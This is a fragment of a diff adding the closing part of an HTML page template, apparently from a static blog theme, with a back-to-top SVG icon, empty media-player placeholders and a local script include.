+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
